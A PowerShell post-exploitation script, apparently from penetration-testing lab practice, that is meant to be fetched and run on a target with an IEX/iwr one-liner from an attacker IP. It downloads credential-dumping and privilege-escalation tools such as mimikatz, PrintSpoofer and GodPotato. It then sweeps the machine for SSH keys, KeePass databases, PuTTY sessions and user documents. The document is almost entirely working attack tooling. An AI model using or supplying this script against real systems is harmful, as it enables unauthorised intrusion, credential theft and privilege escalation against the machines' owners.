# This script is to be used from another machine.
# Allows downloading multiple files at once
# On the attacker, make sure to have the files on the current directory
# Change the $baseurl variable and $fileNames as intended
# Usage on target: 
## On PowerShell -> IEX(iwr -uri http://192.168.45.215/multi-download.ps1 -usebasicparsing) (optional -Path "C:\path\to\directory"))

param (
    [Parameter(Mandatory=$false)]
    [string]$Path
)

$baseurl = "http://192.168.45.215/"
$fileNames = @("mimikatz.exe", "winPEASany.exe","PowerUp.ps1", "SharpHound.exe", "SauronEye.exe", "PowerView.ps1", "PrintSpoofer64.exe","PrivescCheck.ps1", "GodPotato-NET4.exe")

# If no path is provided, set the path to the current directory
if (-not $Path) {
    $downloadPath = Get-Location
} else {
    $downloadPath = $Path
}

foreach ($fileName in $fileNames)
{
    $filePath = Join-Path $downloadPath $fileName

    # Check if the file already exists
    if (Test-Path $filePath) {
        Write-Output "File $fileName already exists at $filePath"
    } else {
        $url = $baseurl + $fileName
        Invoke-WebRequest -Uri $url -OutFile $filePath
        Write-Output "Downloaded $fileName to $filePath"
    }
}


# Ask the user if they want to run post-exploit enumeration
Write-Output "Do you want to run post-exploit enumeration checks? Better as admin. (Y/N)"
$userChoice = Read-Host

if ($userChoice -eq "Y") {
    #general files
    Write-Output "Checking for common file types inside users folders"
    Get-ChildItem -Path C:\Users -Include *.txt,*.ps1,.doc,*.docx,*.xls,*.xlsx,*.ini,*.pdf,*.log, *.kdbx, *.zip -File -Recurse -ErrorAction SilentlyContinue -Force

    #proof and local txt
    Write-Output "Checking for flags"
    Get-ChildItem -Path C:\ -Include proof.txt,local.txt -File -Recurse -ErrorAction SilentlyContinue -Force
    #htb version
    #Get-ChildItem -Path C:\ -Include user.txt,root.txt -File -Recurse -ErrorAction SilentlyContinue -Force

    # Write-Output "Checking for files inside users folders"
    # #recursive c:\users ALL FILES
    # Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue

    #ssh stuff
    Write-Output "Checking for ssh keys"
    Get-ChildItem -Path C:\ -Include *_rsa, *_ecdsa -File -Recurse -ErrorAction SilentlyContinue -Force

    #git stuff
    Write-Output "Checking for git repos"
    Get-ChildItem -Path C:\ -Include *.git -Directory -Recurse -ErrorAction SilentlyContinue -Force

    #putty sessions
    Write-Output "Checking for putty sessions"
    Get-Item -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions"

} else {
    Write-Output "Enumeration checks not selected. Exiting script."
}

Write-Output "Happy Hacking!"
